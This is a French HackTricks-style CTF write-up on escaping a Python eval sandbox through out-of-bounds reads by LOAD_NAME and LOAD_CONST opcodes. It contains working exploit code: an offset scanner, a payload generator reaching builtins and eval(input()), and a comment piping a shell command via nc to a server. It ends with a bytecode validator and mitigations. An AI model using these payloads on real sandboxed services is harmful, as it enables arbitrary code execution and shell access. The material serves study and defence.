# LOAD_NAME / LOAD_CONST opcode OOB Read

{{#include ../../../banners/hacktricks-training.md}}

Cette page adapte le compte-rendu original de Splitline et la chaîne d'exploitation du HITCON CTF 2022 « V O I D ».<sup>[[1]](#references)</sup>

### TL;DR <a href="#tldr-2" id="tldr-2"></a>

Un opérande `LOAD_NAME` ou `LOAD_CONST` peut lire en dehors d'un tuple `co_names` ou `co_consts` volontairement raccourci. Dans ce challenge, des noms factices inaccessibles sont utilisés jusqu'à ce qu'une entrée proche contienne un attribut utile tel que `__getattribute__`.<sup>[[1]](#references)</sup>

Le payload restant réutilise le nom récupéré pour construire une sandbox escape.<sup>[[1]](#references)</sup>

### Vue d'ensemble <a href="#overview-1" id="overview-1"></a>

Le wrapper du challenge est court et compile une expression avant de l'évaluer :<sup>[[1]](#references)</sup>
```python
source = input('>>> ')
if len(source) > 13337: exit(print(f"{'L':O<13337}NG"))
code = compile(source, '∅', 'eval').replace(co_consts=(), co_names=())
print(eval(code, {'__builtins__': {}}))
```
L'entrée est compilée en objet de code Python, puis le wrapper remplace ses `co_consts` et `co_names` par des tuples vides avant d'appeler `eval`.<sup>[[1]](#references)[[5]](#references)</sup>

Toute instruction générée qui indexe encore l'une de ces tables peut faire crasher l'interpréteur ou exposer un pointeur vers un objet adjacent, selon le build.<sup>[[1]](#references)</sup>

### Out of Bound Read <a href="#out-of-bound-read" id="out-of-bound-read"></a>

Comment le segfault se produit-il ?

Pour une expression de liste telle que `[a, b, c]`, le compilateur émet des instructions `LOAD_NAME` avec des opérandes consécutifs :<sup>[[1]](#references)[[2]](#references)</sup>
```
1           0 LOAD_NAME                0 (a)
2 LOAD_NAME                1 (b)
4 LOAD_NAME                2 (c)
6 BUILD_LIST               3
8 RETURN_VALUE
```
Si `co_names` est remplacé par `()`, le bytecode contient toujours `LOAD_NAME 2` ; un accès au tuple non vérifié peut donc récupérer un pointeur situé en dehors du tuple au lieu de lever `IndexError`.<sup>[[1]](#references)[[3]](#references)</sup>

`LOAD_NAME` et `LOAD_CONST` sont les primitives principales ici : leurs opérandes entiers sélectionnent respectivement des entrées dans `co_names` et `co_consts`.<sup>[[1]](#references)[[2]](#references)</sup>

Dans le dispatch de CPython, `LOAD_CONST` récupère l’entrée sélectionnée du tuple et la place sur la pile ; les builds de release utilisent un accesseur de tuple non vérifié :<sup>[[3]](#references)</sup>
```c
case TARGET(LOAD_CONST): {
PREDICTED(LOAD_CONST);
PyObject *value = GETITEM(consts, oparg);
Py_INCREF(value);
PUSH(value);
FAST_DISPATCH();
}
```
Sondez des opérandes `LOAD_NAME` croissants sur l’interpréteur cible afin de cartographier les entrées utiles. Splitline a observé des offsets utiles supérieurs à 700 dans l’environnement du challenge, mais la disposition dépend du build ; un debugger peut aider à inspecter la mémoire environnante.<sup>[[1]](#references)</sup>

### Génération de l’Exploit <a href="#generating-the-exploit" id="generating-the-exploit"></a>

Une fois qu’un offset fournit un nom utile, placez la recherche hors limites dans une expression inaccessible et référencez le même slot `co_names` depuis un accès d’attribut accessible.<sup>[[1]](#references)</sup>

Par exemple, si l’offset 5 fournit `__getattribute__`, conservez ce nom au slot 5 tandis que la branche fausse effectue la recherche utile :<sup>[[1]](#references)</sup>
```python
[a,b,c,d,e,__getattribute__] if [] else [
[].__getattribute__
# you can get the __getattribute__ method of list object now!
]
```
> Le texte récupéré n’a pas besoin d’être `__getattribute__` ; tout identifiant servant le payload peut occuper cet emplacement.<sup>[[1]](#references)</sup>

Le compilateur réutilise un emplacement de `co_names` pour les occurrences répétées d’un même nom, comme l’illustre le désassemblage :<sup>[[1]](#references)[[2]](#references)</sup>
```python
0 BUILD_LIST               0
2 POP_JUMP_IF_FALSE       20
>>    4 LOAD_NAME                0 (a)
>>    6 LOAD_NAME                1 (b)
>>    8 LOAD_NAME                2 (c)
>>   10 LOAD_NAME                3 (d)
>>   12 LOAD_NAME                4 (e)
>>   14 LOAD_NAME                5 (__getattribute__)
16 BUILD_LIST               6
18 RETURN_VALUE
20 BUILD_LIST               0
>>   22 LOAD_ATTR                5 (__getattribute__)
24 BUILD_LIST               1
26 RETURN_VALUE
```
Because `LOAD_ATTR` résout également son nom via `co_names`, la branche accessible peut réutiliser ce slot ; les opérandes compactés dans les versions plus récentes de CPython sont décrits dans les notes de version ci-dessous.<sup>[[1]](#references)[[2]](#references)</sup>

De petits entiers non négatifs peuvent être synthétisés à partir d'expressions booléennes sans constantes :<sup>[[1]](#references)</sup>

- 0: not \[\[]]
- 1: not \[]
- 2: (not \[]) + (not \[])
- ...

### Exploit Script <a href="#exploit-script-1" id="exploit-script-1"></a>

L'exploit original utilisait des noms plutôt que des constantes afin de respecter la limite de longueur du challenge.<sup>[[1]](#references)</sup>

Cet utilitaire analyse les offsets de noms candidats en construisant un objet code avec un tuple `co_names` vide.<sup>[[1]](#references)</sup>
```python
from types import CodeType
from opcode import opmap
from sys import argv


class MockBuiltins(dict):
def __getitem__(self, k):
if type(k) == str:
return k


if __name__ == '__main__':
n = int(argv[1])

code = [
*([opmap['EXTENDED_ARG'], n // 256]
if n // 256 != 0 else []),
opmap['LOAD_NAME'], n % 256,
opmap['RETURN_VALUE'], 0
]

c = CodeType(
0, 0, 0, 0, 0, 0,
bytes(code),
(), (), (), '<sandbox>', '<eval>', 0, b'', ()
)

ret = eval(c, {'__builtins__': MockBuiltins()})
if ret:
print(f'{n}: {ret}')

# for i in $(seq 0 10000); do python find.py $i ; done
```
Le générateur ci-dessous associe les offsets récupérés à des noms et produit le payload au niveau du code source.<sup>[[1]](#references)</sup>
```python
import sys
import unicodedata


class Generator:
# get numner
def __call__(self, num):
if num == 0:
return '(not[[]])'
return '(' + ('(not[])+' * num)[:-1] + ')'

# get string
def __getattribute__(self, name):
try:
offset = None.__dir__().index(name)
return f'keys[{self(offset)}]'
except ValueError:
offset = None.__class__.__dir__(None.__class__).index(name)
return f'keys2[{self(offset)}]'


_ = Generator()

names = []
chr_code = 0
for x in range(4700):
while True:
chr_code += 1
char = unicodedata.normalize('NFKC', chr(chr_code))
if char.isidentifier() and char not in names:
names.append(char)
break

offsets = {
"__delitem__": 2800,
"__getattribute__": 2850,
'__dir__': 4693,
'__repr__': 2128,
}

variables = ('keys', 'keys2', 'None_', 'NoneType',
'm_repr', 'globals', 'builtins',)

for name, offset in offsets.items():
names[offset] = name

for i, var in enumerate(variables):
assert var not in offsets
names[792 + i] = var


source = f'''[
({",".join(names)}) if [] else [],
None_ := [[]].__delitem__({_(0)}),
keys := None_.__dir__(),
NoneType := None_.__getattribute__({_.__class__}),
keys2 := NoneType.__dir__(NoneType),
get := NoneType.__getattribute__,
m_repr := get(
get(get([],{_.__class__}),{_.__base__}),
{_.__subclasses__}
)()[-{_(2)}].__repr__,
globals := get(m_repr, m_repr.__dir__()[{_(6)}]),
builtins := globals[[*globals][{_(7)}]],
builtins[[*builtins][{_(19)}]](
builtins[[*builtins][{_(28)}]](), builtins
)
]'''.strip().replace('\n', '').replace(' ', '')

print(f"{len(source) = }", file=sys.stderr)
print(source)

# (python exp.py; echo '__import__("os").system("sh")'; cat -) | nc challenge.server port
12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273
```
Dans les grandes lignes, le payload généré obtient les variables globales d'une fonction, récupère `builtins` et appelle `eval(input())`.<sup>[[1]](#references)</sup>
```python
getattr = (None).__getattribute__('__class__').__getattribute__
builtins = getattr(
getattr(
getattr(
[].__getattribute__('__class__'),
'__base__'),
'__subclasses__'
)()[-2],
'__repr__').__getattribute__('__globals__')['builtins']
builtins['eval'](builtins['input']())
```
---

### Notes de version et opcodes concernés (Python 3.11–3.13)

- Sur CPython 3.11–3.13, les instructions utilisent toujours des opérandes entiers pour indexer les tables de constantes et de noms de l’objet code. Si l’un des tuples est plus court que l’index référencé, un accès non vérifié peut lire un pointeur d’objet adjacent, puis provoquer un crash ou opérer sur celui-ci ; le comportement exact dépend du build de l’interpréteur.<sup>[[2]](#references)[[3]](#references)</sup>
- `LOAD_CONST consti` et (3.12+) `RETURN_CONST consti` lisent `co_consts[consti]`.<sup>[[2]](#references)</sup>
- Les utilisateurs directs de la table des noms incluent `LOAD_NAME`, `STORE_NAME`, `DELETE_NAME`, `STORE_GLOBAL`, `DELETE_GLOBAL`, `IMPORT_NAME`, `IMPORT_FROM`, `STORE_ATTR`, `DELETE_ATTR` et (3.12+) `LOAD_FROM_DICT_OR_GLOBALS`.<sup>[[2]](#references)</sup>
- `LOAD_GLOBAL namei` et `LOAD_ATTR namei` utilisent `co_names[namei >> 1]` ; le bit de poids faible contrôle le comportement NULL/method documenté. (3.12+) `LOAD_SUPER_ATTR namei` utilise `co_names[namei >> 2]` et encode deux flags dans ses bits de poids faible.<sup>[[2]](#references)</sup>
- Python 3.11+ a introduit des caches adaptatifs/inline qui ajoutent des entrées `CACHE` cachées entre les instructions. Le bytecode fabriqué manuellement doit tenir compte de ces entrées lors de la construction de `co_code`.<sup>[[2]](#references)</sup>

Implication pratique : la disposition du bytecode et les offsets récupérés dépendent de la release et du build. Testez la technique ainsi que tout payload généré avec la version cible de CPython avant de vous y fier.<sup>[[2]](#references)</sup>

### Scanner rapide pour les index OOB utiles (compatible 3.11+/3.12+)

Si vous préférez sonder directement des objets intéressants depuis le bytecode plutôt que depuis du code source de haut niveau, vous pouvez générer des objets code minimaux et tester les index par force brute. L’helper ci-dessous insère les caches inline conformément aux métadonnées `dis` de l’interpréteur cible.<sup>[[2]](#references)</sup>
```python
import dis, types

def assemble(ops):
# ops: list of (opname, arg) pairs
cache = bytes([dis.opmap.get("CACHE", 0), 0])
out = bytearray()
for op, arg in ops:
opc = dis.opmap[op]
out += bytes([opc, arg])
# Python >=3.11 inserts per-opcode inline cache entries
ncache = getattr(dis, "_inline_cache_entries", {}).get(opc, 0)
out += cache * ncache
return bytes(out)

# Reuse an existing function's code layout to simplify CodeType construction
base = (lambda: None).__code__

# Example: probe co_consts[i] with LOAD_CONST i and return it
# co_consts/co_names are intentionally empty so LOAD_* goes OOB

def probe_const(i):
code = assemble([
("RESUME", 0),          # 3.11+
("LOAD_CONST", i),
("RETURN_VALUE", 0),
])
c = base.replace(co_code=code, co_consts=(), co_names=())
try:
return eval(c)
except Exception:
return None

for idx in range(0, 300):
obj = probe_const(idx)
if obj is not None:
print(idx, type(obj), repr(obj)[:80])
```
Remarques
- Pour sonder des noms à la place, remplacez `LOAD_CONST` par `LOAD_NAME`/`LOAD_GLOBAL`/`LOAD_ATTR` et ajustez l’utilisation de la pile ainsi que l’opérande empaqueté pour l’opcode cible.<sup>[[2]](#references)</sup>
- Utilisez `EXTENDED_ARG` ou plusieurs octets de `arg` pour atteindre des index >255 si nécessaire. Cette fonction auxiliaire n’émet que l’octet de poids faible de l’opérande ; les index plus grands nécessitent donc une construction brute des octets ou plusieurs chargements.<sup>[[2]](#references)</sup>

### Pattern minimal de RCE uniquement en bytecode (co_consts OOB → builtins → eval/input)

Une fois que vous avez identifié un index de `co_consts` qui se résout vers le module builtins, vous pouvez reconstruire `eval(input())` sans `co_names` en manipulant la pile. Le matériel officiel du B01lers CTF 2024 `awpcode` documente ce même pattern de lecture OOB.<sup>[[4]](#references)</sup>
```python
# Build co_code that:
# 1) LOAD_CONST <builtins_idx> → push builtins module
# 2) Use stack shuffles and BUILD_TUPLE/UNPACK_EX to peel strings like 'input'/'eval'
#    out of objects living nearby in memory (e.g., from method tables),
# 3) BINARY_SUBSCR to do builtins["input"] / builtins["eval"], CALL each, and RETURN_VALUE
# This pattern is the same idea as the high-level exploit above, but expressed in raw bytecode.
```
Cette approche uniquement basée sur la pile est utile lorsqu’un challenge vous donne un contrôle direct sur `co_code` tout en imposant `co_consts=()` et `co_names=()` ; elle évite les astuces au niveau du code source et peut conserver des payloads de petite taille grâce aux opérations de pile du bytecode et aux constructeurs de tuples.<sup>[[4]](#references)</sup>

### Vérifications défensives et mesures d’atténuation pour les sandboxes

Si vous écrivez une sandbox Python qui compile ou évalue du code non fiable, ne vous fiez pas à CPython pour vérifier les limites des indexes de tuples utilisés par le bytecode. Validez les objets code avant leur exécution.<sup>[[2]](#references)[[3]](#references)</sup>

Validateur pratique (rejette les accès OOB à co_consts/co_names).<sup>[[2]](#references)</sup>
```python
import dis

def max_name_index(code):
max_idx = -1
direct_name_ops = {
"LOAD_NAME", "STORE_NAME", "DELETE_NAME", "STORE_GLOBAL", "DELETE_GLOBAL",
"IMPORT_NAME", "IMPORT_FROM", "STORE_ATTR", "DELETE_ATTR",
"LOAD_FROM_DICT_OR_GLOBALS",
}
for ins in dis.get_instructions(code):
if ins.opname in direct_name_ops | {"LOAD_ATTR", "LOAD_GLOBAL", "LOAD_SUPER_ATTR"}:
namei = ins.arg or 0
# 3.11+: LOAD_ATTR/LOAD_GLOBAL pack one flag; LOAD_SUPER_ATTR packs two.
if ins.opname in {"LOAD_ATTR", "LOAD_GLOBAL"}:
namei >>= 1
elif ins.opname == "LOAD_SUPER_ATTR":
namei >>= 2
max_idx = max(max_idx, namei)
return max_idx

def max_const_index(code):
return max([ins.arg for ins in dis.get_instructions(code)
if ins.opname in {"LOAD_CONST", "RETURN_CONST"}] + [-1])

def validate_code_object(code: type((lambda:0).__code__)):
if max_const_index(code) >= len(code.co_consts):
raise ValueError("Bytecode refers to const index beyond co_consts length")
if max_name_index(code) >= len(code.co_names):
raise ValueError("Bytecode refers to name index beyond co_names length")

# Example use in a sandbox:
# src = input(); c = compile(src, '<sandbox>', 'exec')
# c = c.replace(co_consts=(), co_names=())       # if you really need this, validate first
# validate_code_object(c)
# eval(c, {'__builtins__': {}})
```
Idées supplémentaires de mitigation
- N’autorisez pas l’utilisation arbitraire de `CodeType.replace(...)` avec des entrées non fiables, ou ajoutez des vérifications structurelles strictes sur l’objet code résultant.
- Envisagez d’exécuter le code non fiable dans un processus séparé avec un sandboxing au niveau du système d’exploitation (seccomp, job objects, containers), plutôt que de vous fier à la sémantique de CPython.

## References

- [1] [writeup de Splitline pour le HITCON CTF 2022 « V O I D » (origine de cette technique et chaîne d’exploitation de haut niveau)](https://blog.splitline.tw/hitcon-ctf-2022/)
- [2] [documentation de `dis` de Python 3.13 (indices de bytecode, opérandes de noms compactés et caches inline)](https://docs.python.org/3.13/library/dis.html)
- [3] [macros d’accès aux tuples (`GETITEM`) de CPython 3.13.5](https://github.com/python/cpython/blob/v3.13.5/Python/ceval_macros.h#L133-L143)
- [4] [writeup du challenge `awpcode` du B01lers CTF 2024 (CygnusX)](https://github.com/b01lers/b01lers-ctf-2024-public/tree/main/misc/awpcode)
- [5] [Python C API : objets code](https://docs.python.org/3/c-api/code.html)
{{#include ../../../banners/hacktricks-training.md}}
